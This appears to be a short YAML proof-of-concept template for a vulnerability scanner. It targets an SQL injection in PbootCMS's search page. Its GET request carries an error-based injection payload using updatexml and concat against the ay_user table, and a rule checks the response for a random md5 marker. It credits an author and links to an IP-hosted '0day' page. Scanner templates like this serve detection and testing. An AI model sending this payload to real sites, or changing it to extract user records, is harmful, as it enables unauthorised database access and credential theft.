name: poc-yaml-pbootcms-search-sqli

set:
  r: randomInt(10000, 20000)

rules:
  - method: GET
    path: /index.php/Search/index?keyword=aaaa&updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,md5({{r}}),0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123
    expression: |
      response.status == 200 && response.body.bcontains(bytes(md5(string(r))))

detail:
  author: curtain
  links:
    - http://134.175.191.2/0day/PbootCMS/1.html
